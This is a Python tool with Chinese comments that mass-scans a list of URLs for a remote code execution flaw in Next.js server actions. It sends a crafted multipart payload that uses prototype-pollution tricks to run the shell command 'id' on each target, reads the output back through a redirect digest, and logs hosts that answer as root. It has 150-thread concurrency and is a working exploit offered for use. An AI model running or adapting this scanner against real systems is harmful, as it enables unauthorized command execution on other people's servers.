import requests
import threading
import random
import string
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
import warnings
import time

# 禁用SSL警告
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

# 线程锁用于安全写入文件
file_lock = threading.Lock()

def generate_random_string(length):
    """生成指定长度的随机字符串"""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def build_request_body():
    """构建请求体"""
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
    
    request_id = generate_random_string(8)
    html_request_id = generate_random_string(21)
    
    headers = {
        "Next-Action": "x",
        "X-Nextjs-Request-Id": request_id,
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "X-Nextjs-Html-Request-Id": html_request_id
    }
    
    # 构建multipart/form-data请求体
    # 使用原始字符串避免转义问题
    payload = r'''{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('id').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'''
    
    body_parts = [
        f'--{boundary}',
        'Content-Disposition: form-data; name="0"',
        '',
        payload,
        f'--{boundary}',
        'Content-Disposition: form-data; name="1"',
        '',
        '"$@0"',
        f'--{boundary}',
        'Content-Disposition: form-data; name="2"',
        '',
        '[]',
        f'--{boundary}--',
        ''
    ]
    
    body = '\r\n'.join(body_parts)
    
    return headers, body

def check_vulnerability(url, result_file="result.txt"):
    """检查单个URL是否存在漏洞"""
    try:
        # 确保URL以http://或https://开头
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
            
        # 构造完整的请求URL
        parsed_url = urlparse(url)
        target_url = urljoin(url, "/apps")
        
        # 构建请求头和请求体
        headers, body = build_request_body()
        
        # 发送POST请求，禁用SSL验证
        response = requests.post(
            target_url,
            headers=headers,
            data=body,
            verify=False,
            timeout=10,
            allow_redirects=False  # 不允许重定向，直接获取状态码
        )
        
        # 检查状态码和响应内容
        if response.status_code == 303:
            response_text = response.text
            # 检查响应中是否包含目标字符串
            if "gid=0(root) groups=0(root)" in response_text:
                # 发现漏洞，立即写入文件
                with file_lock:
                    with open(result_file, 'a', encoding='utf-8') as f:
                        f.write(f"[+] 漏洞存在!\n")
                        f.write(f"    URL: {url}\n")
                        f.write(f"    目标地址: {target_url}\n")
                        f.write(f"    状态码: {response.status_code}\n")
                        f.write(f"    响应内容:\n{response_text}\n")
                        f.write("-" * 80 + "\n\n")
                print(f"[+] 发现漏洞: {url}")
                return True
            else:
                print(f"[-] {url} 状态码303但未检测到漏洞特征")
        else:
            print(f"[-] {url} 状态码: {response.status_code} (无漏洞)")
            
    except requests.exceptions.SSLError as e:
        print(f"[!] {url} SSL错误: {e}")
    except requests.exceptions.ConnectionError as e:
        print(f"[!] {url} 连接错误: {e}")
    except requests.exceptions.Timeout as e:
        print(f"[!] {url} 请求超时")
    except requests.exceptions.RequestException as e:
        print(f"[!] {url} 请求异常: {e}")
    except Exception as e:
        print(f"[!] {url} 未知错误: {e}")
    
    return False

def main():
    # 读取URL列表
    try:
        with open('url.txt', 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[错误] 未找到url.txt文件")
        return
    except Exception as e:
        print(f"[错误] 读取url.txt失败: {e}")
        return
    
    if not urls:
        print("[警告] url.txt文件中没有URL")
        return
    
    print(f"[*] 共读取到 {len(urls)} 个URL")
    print(f"[*] 开始扫描，线程数: 150")
    print(f"[*] 开始时间: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("-" * 60)
    
    # 清空或创建结果文件
    with open('result.txt', 'w', encoding='utf-8') as f:
        f.write(f"漏洞扫描结果 - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("=" * 80 + "\n\n")
    
    # 使用线程池并发执行
    vulnerabilities_found = 0
    
    with ThreadPoolExecutor(max_workers=150) as executor:
        # 提交所有任务
        future_to_url = {executor.submit(check_vulnerability, url): url for url in urls}
        
        # 处理完成的任务
        for future in as_completed(future_to_url):
            url = future_to_url[future]
            try:
                if future.result():
                    vulnerabilities_found += 1
            except Exception as e:
                print(f"[!] 处理 {url} 时发生异常: {e}")
    
    print("-" * 60)
    print(f"[*] 扫描完成!")
    print(f"[*] 结束时间: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"[*] 总共发现 {vulnerabilities_found} 个漏洞")
    print(f"[*] 详细结果已保存到 result.txt 文件")

if __name__ == "__main__":
    main()